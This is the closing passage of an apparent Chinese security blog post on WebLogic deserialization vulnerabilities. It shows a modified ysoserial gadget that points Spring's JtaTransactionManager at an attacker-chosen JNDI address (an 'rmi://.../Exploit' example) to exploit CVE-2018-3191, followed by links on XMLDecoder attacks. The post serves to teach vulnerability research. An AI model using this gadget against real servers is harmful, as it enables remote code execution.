+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> UserTransaction <span class="title function_">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException &#123;   <span class="keyword">try</span> &#123;      <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isDebugEnabled()) &#123;         <span class="built_in">this</span>.logger.debug(<span class="string">&quot;Retrieving JTA UserTransaction from JNDI location [&quot;</span> + userTransactionName + <span class="string">&quot;]&quot;</span>);      &#125;      <span class="keyword">return</span> (UserTransaction)<span class="built_in">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);   &#125; <span class="keyword">catch</span> (NamingException var3) &#123;      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransactionSystemException</span>(<span class="string">&quot;JTA UserTransaction is not available at JNDI location [&quot;</span> + userTransactionName + <span class="string">&quot;]&quot;</span>, var3);   &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以其实稍微修改下ysoserial就可以了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">    <span class="comment">// if(command == null) &#123;  </span></span><br><span class="line">    <span class="comment">//     command = &quot;rmi://localhost:1099/Exploit&quot;;  </span></span><br><span class="line">    <span class="comment">// &#125;  </span></span><br><span class="line">    <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();  </span><br><span class="line">    jtaTransactionManager.setUserTransactionName(command);  </span><br><span class="line">    <span class="keyword">return</span> jtaTransactionManager;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于XML"><a href="#基于XML" class="headerlink" title="基于XML"></a>基于XML</h2><p>直接参考文章了<br><a target="_blank" rel="noopener" href="https://dililearngent.github.io/2023/05/02/Weblogic-Security/#%E5%9F%BA%E4%BA%8EXML">https://dililearngent.github.io/2023/05/02/Weblogic-Security/#%E5%9F%BA%E4%BA%8EXML</a><br><a target="_blank" rel="noopener" href="https://y4er.com/posts/java-xmldecoder/">https://y4er.com/posts/java-xmldecoder/</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">T3协议分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">反序列化流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">4.</span> <span class="toc-text">CVE-2015-4852</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">5.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-number">6.</span> <span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-3248"><span class="toc-number">7.</span> <span class="toc-text">CVE-2017-3248</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-number">8.</span> <span class="toc-text">CVE-2018-2628</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">8.1.</span> <span class="toc-text">第一种绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">8.2.</span> <span class="toc-text">第二种绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2893"><span class="toc-number">9.</span> <span class="toc-text">CVE-2018-2893</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-3245"><span class="toc-number">10.</span> <span class="toc-text">CVE-2018-3245</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-3191"><span class="toc-number">11.</span> <span class="toc-text">CVE-2018-3191</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EXML"><span class="toc-number">12.</span> <span class="toc-text">基于XML</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Weblogic反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Weblogic反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic反序列化&body=Check out this article: https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Weblogic反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Weblogic反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Weblogic反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
